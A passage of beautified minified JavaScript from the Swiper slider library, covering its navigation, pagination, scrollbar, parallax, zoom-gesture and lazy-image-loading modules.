        return "container" !== e.params.mousewheel.eventsTarged && (t = L(e.params.mousewheel.eventsTarged)), t.off(A.event, e.mousewheel.handle), !(e.mousewheel.enabled = !1);
      }
    },
    H = {
      update: function () {
        var e = this,
          t = e.params.navigation;
        if (!e.params.loop) {
          var a = e.navigation,
            i = a.$nextEl,
            s = a.$prevEl;
          s && 0 < s.length && (e.isBeginning ? s.addClass(t.disabledClass) : s.removeClass(t.disabledClass), s[e.params.watchOverflow && e.isLocked ? "addClass" : "removeClass"](t.lockClass)), i && 0 < i.length && (e.isEnd ? i.addClass(t.disabledClass) : i.removeClass(t.disabledClass), i[e.params.watchOverflow && e.isLocked ? "addClass" : "removeClass"](t.lockClass));
        }
      },
      onPrevClick: function (e) {
        e.preventDefault(), this.isBeginning && !this.params.loop || this.slidePrev();
      },
      onNextClick: function (e) {
        e.preventDefault(), this.isEnd && !this.params.loop || this.slideNext();
      },
      init: function () {
        var e,
          t,
          a = this,
          i = a.params.navigation;
        (i.nextEl || i.prevEl) && (i.nextEl && (e = L(i.nextEl), a.params.uniqueNavElements && "string" == typeof i.nextEl && 1 < e.length && 1 === a.$el.find(i.nextEl).length && (e = a.$el.find(i.nextEl))), i.prevEl && (t = L(i.prevEl), a.params.uniqueNavElements && "string" == typeof i.prevEl && 1 < t.length && 1 === a.$el.find(i.prevEl).length && (t = a.$el.find(i.prevEl))), e && 0 < e.length && e.on("click", a.navigation.onNextClick), t && 0 < t.length && t.on("click", a.navigation.onPrevClick), ee.extend(a.navigation, {
          $nextEl: e,
          nextEl: e && e[0],
          $prevEl: t,
          prevEl: t && t[0]
        }));
      },
      destroy: function () {
        var e = this,
          t = e.navigation,
          a = t.$nextEl,
          i = t.$prevEl;
        a && a.length && (a.off("click", e.navigation.onNextClick), a.removeClass(e.params.navigation.disabledClass)), i && i.length && (i.off("click", e.navigation.onPrevClick), i.removeClass(e.params.navigation.disabledClass));
      }
    },
    N = {
      update: function () {
        var e = this,
          t = e.rtl,
          s = e.params.pagination;
        if (s.el && e.pagination.el && e.pagination.$el && 0 !== e.pagination.$el.length) {
          var r,
            a = e.virtual && e.params.virtual.enabled ? e.virtual.slides.length : e.slides.length,
            i = e.pagination.$el,
            n = e.params.loop ? Math.ceil((a - 2 * e.loopedSlides) / e.params.slidesPerGroup) : e.snapGrid.length;
          if (e.params.loop ? ((r = Math.ceil((e.activeIndex - e.loopedSlides) / e.params.slidesPerGroup)) > a - 1 - 2 * e.loopedSlides && (r -= a - 2 * e.loopedSlides), n - 1 < r && (r -= n), r < 0 && "bullets" !== e.params.paginationType && (r = n + r)) : r = void 0 !== e.snapIndex ? e.snapIndex : e.activeIndex || 0, "bullets" === s.type && e.pagination.bullets && 0 < e.pagination.bullets.length) {
            var o,
              l,
              d,
              p = e.pagination.bullets;
            if (s.dynamicBullets && (e.pagination.bulletSize = p.eq(0)[e.isHorizontal() ? "outerWidth" : "outerHeight"](!0), i.css(e.isHorizontal() ? "width" : "height", e.pagination.bulletSize * (s.dynamicMainBullets + 4) + "px"), 1 < s.dynamicMainBullets && void 0 !== e.previousIndex && (e.pagination.dynamicBulletIndex += r - e.previousIndex, e.pagination.dynamicBulletIndex > s.dynamicMainBullets - 1 ? e.pagination.dynamicBulletIndex = s.dynamicMainBullets - 1 : e.pagination.dynamicBulletIndex < 0 && (e.pagination.dynamicBulletIndex = 0)), o = r - e.pagination.dynamicBulletIndex, d = ((l = o + (Math.min(p.length, s.dynamicMainBullets) - 1)) + o) / 2), p.removeClass(s.bulletActiveClass + " " + s.bulletActiveClass + "-next " + s.bulletActiveClass + "-next-next " + s.bulletActiveClass + "-prev " + s.bulletActiveClass + "-prev-prev " + s.bulletActiveClass + "-main"), 1 < i.length) p.each(function (e, t) {
              var a = L(t),
                i = a.index();
              i === r && a.addClass(s.bulletActiveClass), s.dynamicBullets && (o <= i && i <= l && a.addClass(s.bulletActiveClass + "-main"), i === o && a.prev().addClass(s.bulletActiveClass + "-prev").prev().addClass(s.bulletActiveClass + "-prev-prev"), i === l && a.next().addClass(s.bulletActiveClass + "-next").next().addClass(s.bulletActiveClass + "-next-next"));
            });else if (p.eq(r).addClass(s.bulletActiveClass), s.dynamicBullets) {
              for (var c = p.eq(o), u = p.eq(l), h = o; h <= l; h += 1) p.eq(h).addClass(s.bulletActiveClass + "-main");
              c.prev().addClass(s.bulletActiveClass + "-prev").prev().addClass(s.bulletActiveClass + "-prev-prev"), u.next().addClass(s.bulletActiveClass + "-next").next().addClass(s.bulletActiveClass + "-next-next");
            }
            if (s.dynamicBullets) {
              var v = Math.min(p.length, s.dynamicMainBullets + 4),
                f = (e.pagination.bulletSize * v - e.pagination.bulletSize) / 2 - d * e.pagination.bulletSize,
                m = t ? "right" : "left";
              p.css(e.isHorizontal() ? m : "top", f + "px");
            }
          }
          if ("fraction" === s.type && (i.find("." + s.currentClass).text(s.formatFractionCurrent(r + 1)), i.find("." + s.totalClass).text(s.formatFractionTotal(n))), "progressbar" === s.type) {
            var g;
            g = s.progressbarOpposite ? e.isHorizontal() ? "vertical" : "horizontal" : e.isHorizontal() ? "horizontal" : "vertical";
            var b = (r + 1) / n,
              w = 1,
              y = 1;
            "horizontal" === g ? w = b : y = b, i.find("." + s.progressbarFillClass).transform("translate3d(0,0,0) scaleX(" + w + ") scaleY(" + y + ")").transition(e.params.speed);
          }
          "custom" === s.type && s.renderCustom ? (i.html(s.renderCustom(e, r + 1, n)), e.emit("paginationRender", e, i[0])) : e.emit("paginationUpdate", e, i[0]), i[e.params.watchOverflow && e.isLocked ? "addClass" : "removeClass"](s.lockClass);
        }
      },
      render: function () {
        var e = this,
          t = e.params.pagination;
        if (t.el && e.pagination.el && e.pagination.$el && 0 !== e.pagination.$el.length) {
          var a = e.virtual && e.params.virtual.enabled ? e.virtual.slides.length : e.slides.length,
            i = e.pagination.$el,
            s = "";
          if ("bullets" === t.type) {
            for (var r = e.params.loop ? Math.ceil((a - 2 * e.loopedSlides) / e.params.slidesPerGroup) : e.snapGrid.length, n = 0; n < r; n += 1) t.renderBullet ? s += t.renderBullet.call(e, n, t.bulletClass) : s += "<" + t.bulletElement + ' class="' + t.bulletClass + '"></' + t.bulletElement + ">";
            i.html(s), e.pagination.bullets = i.find("." + t.bulletClass);
          }
          "fraction" === t.type && (s = t.renderFraction ? t.renderFraction.call(e, t.currentClass, t.totalClass) : '<span class="' + t.currentClass + '"></span> / <span class="' + t.totalClass + '"></span>', i.html(s)), "progressbar" === t.type && (s = t.renderProgressbar ? t.renderProgressbar.call(e, t.progressbarFillClass) : '<span class="' + t.progressbarFillClass + '"></span>', i.html(s)), "custom" !== t.type && e.emit("paginationRender", e.pagination.$el[0]);
        }
      },
      init: function () {
        var a = this,
          e = a.params.pagination;
        if (e.el) {
          var t = L(e.el);
          0 !== t.length && (a.params.uniqueNavElements && "string" == typeof e.el && 1 < t.length && 1 === a.$el.find(e.el).length && (t = a.$el.find(e.el)), "bullets" === e.type && e.clickable && t.addClass(e.clickableClass), t.addClass(e.modifierClass + e.type), "bullets" === e.type && e.dynamicBullets && (t.addClass("" + e.modifierClass + e.type + "-dynamic"), a.pagination.dynamicBulletIndex = 0, e.dynamicMainBullets < 1 && (e.dynamicMainBullets = 1)), "progressbar" === e.type && e.progressbarOpposite && t.addClass(e.progressbarOppositeClass), e.clickable && t.on("click", "." + e.bulletClass, function (e) {
            e.preventDefault();
            var t = L(this).index() * a.params.slidesPerGroup;
            a.params.loop && (t += a.loopedSlides), a.slideTo(t);
          }), ee.extend(a.pagination, {
            $el: t,
            el: t[0]
          }));
        }
      },
      destroy: function () {
        var e = this,
          t = e.params.pagination;
        if (t.el && e.pagination.el && e.pagination.$el && 0 !== e.pagination.$el.length) {
          var a = e.pagination.$el;
          a.removeClass(t.hiddenClass), a.removeClass(t.modifierClass + t.type), e.pagination.bullets && e.pagination.bullets.removeClass(t.bulletActiveClass), t.clickable && a.off("click", "." + t.bulletClass);
        }
      }
    },
    G = {
      setTranslate: function () {
        var e = this;
        if (e.params.scrollbar.el && e.scrollbar.el) {
          var t = e.scrollbar,
            a = e.rtlTranslate,
            i = e.progress,
            s = t.dragSize,
            r = t.trackSize,
            n = t.$dragEl,
            o = t.$el,
            l = e.params.scrollbar,
            d = s,
            p = (r - s) * i;
          a ? 0 < (p = -p) ? (d = s - p, p = 0) : r < -p + s && (d = r + p) : p < 0 ? (d = s + p, p = 0) : r < p + s && (d = r - p), e.isHorizontal() ? (te.transforms3d ? n.transform("translate3d(" + p + "px, 0, 0)") : n.transform("translateX(" + p + "px)"), n[0].style.width = d + "px") : (te.transforms3d ? n.transform("translate3d(0px, " + p + "px, 0)") : n.transform("translateY(" + p + "px)"), n[0].style.height = d + "px"), l.hide && (clearTimeout(e.scrollbar.timeout), o[0].style.opacity = 1, e.scrollbar.timeout = setTimeout(function () {
            o[0].style.opacity = 0, o.transition(400);
          }, 1e3));
        }
      },
      setTransition: function (e) {
        this.params.scrollbar.el && this.scrollbar.el && this.scrollbar.$dragEl.transition(e);
      },
      updateSize: function () {
        var e = this;
        if (e.params.scrollbar.el && e.scrollbar.el) {
          var t = e.scrollbar,
            a = t.$dragEl,
            i = t.$el;
          a[0].style.width = "", a[0].style.height = "";
          var s,
            r = e.isHorizontal() ? i[0].offsetWidth : i[0].offsetHeight,
            n = e.size / e.virtualSize,
            o = n * (r / e.size);
          s = "auto" === e.params.scrollbar.dragSize ? r * n : parseInt(e.params.scrollbar.dragSize, 10), e.isHorizontal() ? a[0].style.width = s + "px" : a[0].style.height = s + "px", i[0].style.display = 1 <= n ? "none" : "", e.params.scrollbar.hide && (i[0].style.opacity = 0), ee.extend(t, {
            trackSize: r,
            divider: n,
            moveDivider: o,
            dragSize: s
          }), t.$el[e.params.watchOverflow && e.isLocked ? "addClass" : "removeClass"](e.params.scrollbar.lockClass);
        }
      },
      setDragPosition: function (e) {
        var t,
          a = this,
          i = a.scrollbar,
          s = a.rtlTranslate,
          r = i.$el,
          n = i.dragSize,
          o = i.trackSize;
        t = ((a.isHorizontal() ? "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX || e.clientX : "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY || e.clientY) - r.offset()[a.isHorizontal() ? "left" : "top"] - n / 2) / (o - n), t = Math.max(Math.min(t, 1), 0), s && (t = 1 - t);
        var l = a.minTranslate() + (a.maxTranslate() - a.minTranslate()) * t;
        a.updateProgress(l), a.setTranslate(l), a.updateActiveIndex(), a.updateSlidesClasses();
      },
      onDragStart: function (e) {
        var t = this,
          a = t.params.scrollbar,
          i = t.scrollbar,
          s = t.$wrapperEl,
          r = i.$el,
          n = i.$dragEl;
        t.scrollbar.isTouched = !0, e.preventDefault(), e.stopPropagation(), s.transition(100), n.transition(100), i.setDragPosition(e), clearTimeout(t.scrollbar.dragTimeout), r.transition(0), a.hide && r.css("opacity", 1), t.emit("scrollbarDragStart", e);
      },
      onDragMove: function (e) {
        var t = this.scrollbar,
          a = this.$wrapperEl,
          i = t.$el,
          s = t.$dragEl;
        this.scrollbar.isTouched && (e.preventDefault ? e.preventDefault() : e.returnValue = !1, t.setDragPosition(e), a.transition(0), i.transition(0), s.transition(0), this.emit("scrollbarDragMove", e));
      },
      onDragEnd: function (e) {
        var t = this,
          a = t.params.scrollbar,
          i = t.scrollbar.$el;
        t.scrollbar.isTouched && (t.scrollbar.isTouched = !1, a.hide && (clearTimeout(t.scrollbar.dragTimeout), t.scrollbar.dragTimeout = ee.nextTick(function () {
          i.css("opacity", 0), i.transition(400);
        }, 1e3)), t.emit("scrollbarDragEnd", e), a.snapOnRelease && t.slideToClosest());
      },
      enableDraggable: function () {
        var e = this;
        if (e.params.scrollbar.el) {
          var t = e.scrollbar,
            a = e.touchEventsTouch,
            i = e.touchEventsDesktop,
            s = e.params,
            r = t.$el[0],
            n = !(!te.passiveListener || !s.passiveListeners) && {
              passive: !1,
              capture: !1
            },
            o = !(!te.passiveListener || !s.passiveListeners) && {
              passive: !0,
              capture: !1
            };
          te.touch ? (r.addEventListener(a.start, e.scrollbar.onDragStart, n), r.addEventListener(a.move, e.scrollbar.onDragMove, n), r.addEventListener(a.end, e.scrollbar.onDragEnd, o)) : (r.addEventListener(i.start, e.scrollbar.onDragStart, n), f.addEventListener(i.move, e.scrollbar.onDragMove, n), f.addEventListener(i.end, e.scrollbar.onDragEnd, o));
        }
      },
      disableDraggable: function () {
        var e = this;
        if (e.params.scrollbar.el) {
          var t = e.scrollbar,
            a = e.touchEventsTouch,
            i = e.touchEventsDesktop,
            s = e.params,
            r = t.$el[0],
            n = !(!te.passiveListener || !s.passiveListeners) && {
              passive: !1,
              capture: !1
            },
            o = !(!te.passiveListener || !s.passiveListeners) && {
              passive: !0,
              capture: !1
            };
          te.touch ? (r.removeEventListener(a.start, e.scrollbar.onDragStart, n), r.removeEventListener(a.move, e.scrollbar.onDragMove, n), r.removeEventListener(a.end, e.scrollbar.onDragEnd, o)) : (r.removeEventListener(i.start, e.scrollbar.onDragStart, n), f.removeEventListener(i.move, e.scrollbar.onDragMove, n), f.removeEventListener(i.end, e.scrollbar.onDragEnd, o));
        }
      },
      init: function () {
        var e = this;
        if (e.params.scrollbar.el) {
          var t = e.scrollbar,
            a = e.$el,
            i = e.params.scrollbar,
            s = L(i.el);
          e.params.uniqueNavElements && "string" == typeof i.el && 1 < s.length && 1 === a.find(i.el).length && (s = a.find(i.el));
          var r = s.find("." + e.params.scrollbar.dragClass);
          0 === r.length && (r = L('<div class="' + e.params.scrollbar.dragClass + '"></div>'), s.append(r)), ee.extend(t, {
            $el: s,
            el: s[0],
            $dragEl: r,
            dragEl: r[0]
          }), i.draggable && t.enableDraggable();
        }
      },
      destroy: function () {
        this.scrollbar.disableDraggable();
      }
    },
    B = {
      setTransform: function (e, t) {
        var a = this.rtl,
          i = L(e),
          s = a ? -1 : 1,
          r = i.attr("data-swiper-parallax") || "0",
          n = i.attr("data-swiper-parallax-x"),
          o = i.attr("data-swiper-parallax-y"),
          l = i.attr("data-swiper-parallax-scale"),
          d = i.attr("data-swiper-parallax-opacity");
        if (n || o ? (n = n || "0", o = o || "0") : this.isHorizontal() ? (n = r, o = "0") : (o = r, n = "0"), n = 0 <= n.indexOf("%") ? parseInt(n, 10) * t * s + "%" : n * t * s + "px", o = 0 <= o.indexOf("%") ? parseInt(o, 10) * t + "%" : o * t + "px", null != d) {
          var p = d - (d - 1) * (1 - Math.abs(t));
          i[0].style.opacity = p;
        }
        if (null == l) i.transform("translate3d(" + n + ", " + o + ", 0px)");else {
          var c = l - (l - 1) * (1 - Math.abs(t));
          i.transform("translate3d(" + n + ", " + o + ", 0px) scale(" + c + ")");
        }
      },
      setTranslate: function () {
        var i = this,
          e = i.$el,
          t = i.slides,
          s = i.progress,
          r = i.snapGrid;
        e.children("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y]").each(function (e, t) {
          i.parallax.setTransform(t, s);
        }), t.each(function (e, t) {
          var a = t.progress;
          1 < i.params.slidesPerGroup && "auto" !== i.params.slidesPerView && (a += Math.ceil(e / 2) - s * (r.length - 1)), a = Math.min(Math.max(a, -1), 1), L(t).find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y]").each(function (e, t) {
            i.parallax.setTransform(t, a);
          });
        });
      },
      setTransition: function (s) {
        void 0 === s && (s = this.params.speed);
        this.$el.find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y]").each(function (e, t) {
          var a = L(t),
            i = parseInt(a.attr("data-swiper-parallax-duration"), 10) || s;
          0 === s && (i = 0), a.transition(i);
        });
      }
    },
    X = {
      getDistanceBetweenTouches: function (e) {
        if (e.targetTouches.length < 2) return 1;
        var t = e.targetTouches[0].pageX,
          a = e.targetTouches[0].pageY,
          i = e.targetTouches[1].pageX,
          s = e.targetTouches[1].pageY;
        return Math.sqrt(Math.pow(i - t, 2) + Math.pow(s - a, 2));
      },
      onGestureStart: function (e) {
        var t = this,
          a = t.params.zoom,
          i = t.zoom,
          s = i.gesture;
        if (i.fakeGestureTouched = !1, i.fakeGestureMoved = !1, !te.gestures) {
          if ("touchstart" !== e.type || "touchstart" === e.type && e.targetTouches.length < 2) return;
          i.fakeGestureTouched = !0, s.scaleStart = X.getDistanceBetweenTouches(e);
        }
        s.$slideEl && s.$slideEl.length || (s.$slideEl = L(e.target).closest(".swiper-slide"), 0 === s.$slideEl.length && (s.$slideEl = t.slides.eq(t.activeIndex)), s.$imageEl = s.$slideEl.find("img, svg, canvas"), s.$imageWrapEl = s.$imageEl.parent("." + a.containerClass), s.maxRatio = s.$imageWrapEl.attr("data-swiper-zoom") || a.maxRatio, 0 !== s.$imageWrapEl.length) ? (s.$imageEl.transition(0), t.zoom.isScaling = !0) : s.$imageEl = void 0;
      },
      onGestureChange: function (e) {
        var t = this.params.zoom,
          a = this.zoom,
          i = a.gesture;
        if (!te.gestures) {
          if ("touchmove" !== e.type || "touchmove" === e.type && e.targetTouches.length < 2) return;
          a.fakeGestureMoved = !0, i.scaleMove = X.getDistanceBetweenTouches(e);
        }
        i.$imageEl && 0 !== i.$imageEl.length && (a.scale = te.gestures ? e.scale * a.currentScale : i.scaleMove / i.scaleStart * a.currentScale, a.scale > i.maxRatio && (a.scale = i.maxRatio - 1 + Math.pow(a.scale - i.maxRatio + 1, .5)), a.scale < t.minRatio && (a.scale = t.minRatio + 1 - Math.pow(t.minRatio - a.scale + 1, .5)), i.$imageEl.transform("translate3d(0,0,0) scale(" + a.scale + ")"));
      },
      onGestureEnd: function (e) {
        var t = this.params.zoom,
          a = this.zoom,
          i = a.gesture;
        if (!te.gestures) {
          if (!a.fakeGestureTouched || !a.fakeGestureMoved) return;
          if ("touchend" !== e.type || "touchend" === e.type && e.changedTouches.length < 2 && !g.android) return;
          a.fakeGestureTouched = !1, a.fakeGestureMoved = !1;
        }
        i.$imageEl && 0 !== i.$imageEl.length && (a.scale = Math.max(Math.min(a.scale, i.maxRatio), t.minRatio), i.$imageEl.transition(this.params.speed).transform("translate3d(0,0,0) scale(" + a.scale + ")"), a.currentScale = a.scale, a.isScaling = !1, 1 === a.scale && (i.$slideEl = void 0));
      },
      onTouchStart: function (e) {
        var t = this.zoom,
          a = t.gesture,
          i = t.image;
        a.$imageEl && 0 !== a.$imageEl.length && (i.isTouched || (g.android && e.preventDefault(), i.isTouched = !0, i.touchesStart.x = "touchstart" === e.type ? e.targetTouches[0].pageX : e.pageX, i.touchesStart.y = "touchstart" === e.type ? e.targetTouches[0].pageY : e.pageY));
      },
      onTouchMove: function (e) {
        var t = this,
          a = t.zoom,
          i = a.gesture,
          s = a.image,
          r = a.velocity;
        if (i.$imageEl && 0 !== i.$imageEl.length && (t.allowClick = !1, s.isTouched && i.$slideEl)) {
          s.isMoved || (s.width = i.$imageEl[0].offsetWidth, s.height = i.$imageEl[0].offsetHeight, s.startX = ee.getTranslate(i.$imageWrapEl[0], "x") || 0, s.startY = ee.getTranslate(i.$imageWrapEl[0], "y") || 0, i.slideWidth = i.$slideEl[0].offsetWidth, i.slideHeight = i.$slideEl[0].offsetHeight, i.$imageWrapEl.transition(0), t.rtl && (s.startX = -s.startX, s.startY = -s.startY));
          var n = s.width * a.scale,
            o = s.height * a.scale;
          if (!(n < i.slideWidth && o < i.slideHeight)) {
            if (s.minX = Math.min(i.slideWidth / 2 - n / 2, 0), s.maxX = -s.minX, s.minY = Math.min(i.slideHeight / 2 - o / 2, 0), s.maxY = -s.minY, s.touchesCurrent.x = "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX, s.touchesCurrent.y = "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY, !s.isMoved && !a.isScaling) {
              if (t.isHorizontal() && (Math.floor(s.minX) === Math.floor(s.startX) && s.touchesCurrent.x < s.touchesStart.x || Math.floor(s.maxX) === Math.floor(s.startX) && s.touchesCurrent.x > s.touchesStart.x)) return void (s.isTouched = !1);
              if (!t.isHorizontal() && (Math.floor(s.minY) === Math.floor(s.startY) && s.touchesCurrent.y < s.touchesStart.y || Math.floor(s.maxY) === Math.floor(s.startY) && s.touchesCurrent.y > s.touchesStart.y)) return void (s.isTouched = !1);
            }
            e.preventDefault(), e.stopPropagation(), s.isMoved = !0, s.currentX = s.touchesCurrent.x - s.touchesStart.x + s.startX, s.currentY = s.touchesCurrent.y - s.touchesStart.y + s.startY, s.currentX < s.minX && (s.currentX = s.minX + 1 - Math.pow(s.minX - s.currentX + 1, .8)), s.currentX > s.maxX && (s.currentX = s.maxX - 1 + Math.pow(s.currentX - s.maxX + 1, .8)), s.currentY < s.minY && (s.currentY = s.minY + 1 - Math.pow(s.minY - s.currentY + 1, .8)), s.currentY > s.maxY && (s.currentY = s.maxY - 1 + Math.pow(s.currentY - s.maxY + 1, .8)), r.prevPositionX || (r.prevPositionX = s.touchesCurrent.x), r.prevPositionY || (r.prevPositionY = s.touchesCurrent.y), r.prevTime || (r.prevTime = Date.now()), r.x = (s.touchesCurrent.x - r.prevPositionX) / (Date.now() - r.prevTime) / 2, r.y = (s.touchesCurrent.y - r.prevPositionY) / (Date.now() - r.prevTime) / 2, Math.abs(s.touchesCurrent.x - r.prevPositionX) < 2 && (r.x = 0), Math.abs(s.touchesCurrent.y - r.prevPositionY) < 2 && (r.y = 0), r.prevPositionX = s.touchesCurrent.x, r.prevPositionY = s.touchesCurrent.y, r.prevTime = Date.now(), i.$imageWrapEl.transform("translate3d(" + s.currentX + "px, " + s.currentY + "px,0)");
          }
        }
      },
      onTouchEnd: function () {
        var e = this.zoom,
          t = e.gesture,
          a = e.image,
          i = e.velocity;
        if (t.$imageEl && 0 !== t.$imageEl.length) {
          if (!a.isTouched || !a.isMoved) return a.isTouched = !1, void (a.isMoved = !1);
          a.isTouched = !1, a.isMoved = !1;
          var s = 300,
            r = 300,
            n = i.x * s,
            o = a.currentX + n,
            l = i.y * r,
            d = a.currentY + l;
          0 !== i.x && (s = Math.abs((o - a.currentX) / i.x)), 0 !== i.y && (r = Math.abs((d - a.currentY) / i.y));
          var p = Math.max(s, r);
          a.currentX = o, a.currentY = d;
          var c = a.width * e.scale,
            u = a.height * e.scale;
          a.minX = Math.min(t.slideWidth / 2 - c / 2, 0), a.maxX = -a.minX, a.minY = Math.min(t.slideHeight / 2 - u / 2, 0), a.maxY = -a.minY, a.currentX = Math.max(Math.min(a.currentX, a.maxX), a.minX), a.currentY = Math.max(Math.min(a.currentY, a.maxY), a.minY), t.$imageWrapEl.transition(p).transform("translate3d(" + a.currentX + "px, " + a.currentY + "px,0)");
        }
      },
      onTransitionEnd: function () {
        var e = this.zoom,
          t = e.gesture;
        t.$slideEl && this.previousIndex !== this.activeIndex && (t.$imageEl.transform("translate3d(0,0,0) scale(1)"), t.$imageWrapEl.transform("translate3d(0,0,0)"), e.scale = 1, e.currentScale = 1, t.$slideEl = void 0, t.$imageEl = void 0, t.$imageWrapEl = void 0);
      },
      toggle: function (e) {
        var t = this.zoom;
        t.scale && 1 !== t.scale ? t.out() : t.in(e);
      },
      in: function (e) {
        var t,
          a,
          i,
          s,
          r,
          n,
          o,
          l,
          d,
          p,
          c,
          u,
          h,
          v,
          f,
          m,
          g = this,
          b = g.zoom,
          w = g.params.zoom,
          y = b.gesture,
          x = b.image;
        (y.$slideEl || (y.$slideEl = g.clickedSlide ? L(g.clickedSlide) : g.slides.eq(g.activeIndex), y.$imageEl = y.$slideEl.find("img, svg, canvas"), y.$imageWrapEl = y.$imageEl.parent("." + w.containerClass)), y.$imageEl && 0 !== y.$imageEl.length) && (y.$slideEl.addClass("" + w.zoomedSlideClass), void 0 === x.touchesStart.x && e ? (t = "touchend" === e.type ? e.changedTouches[0].pageX : e.pageX, a = "touchend" === e.type ? e.changedTouches[0].pageY : e.pageY) : (t = x.touchesStart.x, a = x.touchesStart.y), b.scale = y.$imageWrapEl.attr("data-swiper-zoom") || w.maxRatio, b.currentScale = y.$imageWrapEl.attr("data-swiper-zoom") || w.maxRatio, e ? (f = y.$slideEl[0].offsetWidth, m = y.$slideEl[0].offsetHeight, i = y.$slideEl.offset().left + f / 2 - t, s = y.$slideEl.offset().top + m / 2 - a, o = y.$imageEl[0].offsetWidth, l = y.$imageEl[0].offsetHeight, d = o * b.scale, p = l * b.scale, h = -(c = Math.min(f / 2 - d / 2, 0)), v = -(u = Math.min(m / 2 - p / 2, 0)), (r = i * b.scale) < c && (r = c), h < r && (r = h), (n = s * b.scale) < u && (n = u), v < n && (n = v)) : n = r = 0, y.$imageWrapEl.transition(300).transform("translate3d(" + r + "px, " + n + "px,0)"), y.$imageEl.transition(300).transform("translate3d(0,0,0) scale(" + b.scale + ")"));
      },
      out: function () {
        var e = this,
          t = e.zoom,
          a = e.params.zoom,
          i = t.gesture;
        i.$slideEl || (i.$slideEl = e.clickedSlide ? L(e.clickedSlide) : e.slides.eq(e.activeIndex), i.$imageEl = i.$slideEl.find("img, svg, canvas"), i.$imageWrapEl = i.$imageEl.parent("." + a.containerClass)), i.$imageEl && 0 !== i.$imageEl.length && (t.scale = 1, t.currentScale = 1, i.$imageWrapEl.transition(300).transform("translate3d(0,0,0)"), i.$imageEl.transition(300).transform("translate3d(0,0,0) scale(1)"), i.$slideEl.removeClass("" + a.zoomedSlideClass), i.$slideEl = void 0);
      },
      enable: function () {
        var e = this,
          t = e.zoom;
        if (!t.enabled) {
          t.enabled = !0;
          var a = !("touchstart" !== e.touchEvents.start || !te.passiveListener || !e.params.passiveListeners) && {
            passive: !0,
            capture: !1
          };
          te.gestures ? (e.$wrapperEl.on("gesturestart", ".swiper-slide", t.onGestureStart, a), e.$wrapperEl.on("gesturechange", ".swiper-slide", t.onGestureChange, a), e.$wrapperEl.on("gestureend", ".swiper-slide", t.onGestureEnd, a)) : "touchstart" === e.touchEvents.start && (e.$wrapperEl.on(e.touchEvents.start, ".swiper-slide", t.onGestureStart, a), e.$wrapperEl.on(e.touchEvents.move, ".swiper-slide", t.onGestureChange, a), e.$wrapperEl.on(e.touchEvents.end, ".swiper-slide", t.onGestureEnd, a)), e.$wrapperEl.on(e.touchEvents.move, "." + e.params.zoom.containerClass, t.onTouchMove);
        }
      },
      disable: function () {
        var e = this,
          t = e.zoom;
        if (t.enabled) {
          e.zoom.enabled = !1;
          var a = !("touchstart" !== e.touchEvents.start || !te.passiveListener || !e.params.passiveListeners) && {
            passive: !0,
            capture: !1
          };
          te.gestures ? (e.$wrapperEl.off("gesturestart", ".swiper-slide", t.onGestureStart, a), e.$wrapperEl.off("gesturechange", ".swiper-slide", t.onGestureChange, a), e.$wrapperEl.off("gestureend", ".swiper-slide", t.onGestureEnd, a)) : "touchstart" === e.touchEvents.start && (e.$wrapperEl.off(e.touchEvents.start, ".swiper-slide", t.onGestureStart, a), e.$wrapperEl.off(e.touchEvents.move, ".swiper-slide", t.onGestureChange, a), e.$wrapperEl.off(e.touchEvents.end, ".swiper-slide", t.onGestureEnd, a)), e.$wrapperEl.off(e.touchEvents.move, "." + e.params.zoom.containerClass, t.onTouchMove);
        }
      }
    },
    Y = {
      loadInSlide: function (e, l) {
        void 0 === l && (l = !0);
        var d = this,
          p = d.params.lazy;
        if (void 0 !== e && 0 !== d.slides.length) {
          var c = d.virtual && d.params.virtual.enabled ? d.$wrapperEl.children("." + d.params.slideClass + '[data-swiper-slide-index="' + e + '"]') : d.slides.eq(e),
            t = c.find("." + p.elementClass + ":not(." + p.loadedClass + "):not(." + p.loadingClass + ")");
          !c.hasClass(p.elementClass) || c.hasClass(p.loadedClass) || c.hasClass(p.loadingClass) || (t = t.add(c[0])), 0 !== t.length && t.each(function (e, t) {
            var i = L(t);
            i.addClass(p.loadingClass);
            var s = i.attr("data-background"),
              r = i.attr("data-src"),
              n = i.attr("data-srcset"),
              o = i.attr("data-sizes");
            d.loadImage(i[0], r || s, n, o, !1, function () {
              if (null != d && d && (!d || d.params) && !d.destroyed) {
                if (s ? (i.css("background-image", 'url("' + s + '")'), i.removeAttr("data-background")) : (n && (i.attr("srcset", n), i.removeAttr("data-srcset")), o && (i.attr("sizes", o), i.removeAttr("data-sizes")), r && (i.attr("src", r), i.removeAttr("data-src"))), i.addClass(p.loadedClass).removeClass(p.loadingClass), c.find("." + p.preloaderClass).remove(), d.params.loop && l) {
                  var e = c.attr("data-swiper-slide-index");
                  if (c.hasClass(d.params.slideDuplicateClass)) {
                    var t = d.$wrapperEl.children('[data-swiper-slide-index="' + e + '"]:not(.' + d.params.slideDuplicateClass + ")");
                    d.lazy.loadInSlide(t.index(), !1);
                  } else {
                    var a = d.$wrapperEl.children("." + d.params.slideDuplicateClass + '[data-swiper-slide-index="' + e + '"]');
                    d.lazy.loadInSlide(a.index(), !1);
                  }
                }
                d.emit("lazyImageReady", c[0], i[0]);
              }
            }), d.emit("lazyImageLoad", c[0], i[0]);
          });
        }
      },
      load: function () {
        var i = this,
          t = i.$wrapperEl,
          a = i.params,
          s = i.slides,
          e = i.activeIndex,
          r = i.virtual && a.virtual.enabled,
          n = a.lazy,
          o = a.slidesPerView;
        function l(e) {
          if (r) {
            if (t.children("." + a.slideClass + '[data-swiper-slide-index="' + e + '"]').length) return !0;
          } else if (s[e]) return !0;
          return !1;
        }
        function d(e) {
          return r ? L(e).attr("data-swiper-slide-index") : L(e).index();
        }
        if ("auto" === o && (o = 0), i.lazy.initialImageLoaded || (i.lazy.initialImageLoaded = !0), i.params.watchSlidesVisibility) t.children("." + a.slideVisibleClass).each(function (e, t) {
          var a = r ? L(t).attr("data-swiper-slide-index") : L(t).index();
          i.lazy.loadInSlide(a);
        });else if (1 < o) for (var p = e; p < e + o; p += 1) l(p) && i.lazy.loadInSlide(p);else i.lazy.loadInSlide(e);
